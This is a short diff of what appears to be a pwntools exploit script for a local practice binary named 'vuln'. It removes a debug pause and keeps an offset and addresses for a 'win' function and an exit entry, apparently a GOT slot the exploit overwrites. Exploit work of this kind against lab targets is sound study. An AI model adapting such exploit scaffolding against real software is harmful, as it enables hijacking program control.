@@ -1,6 +1,6 @@
 from pwn import *
 s = process('./vuln')
-raw_input('debug')
+
 offset = 0x40
 win = 0x8048936 
 exit = 0x804d02c
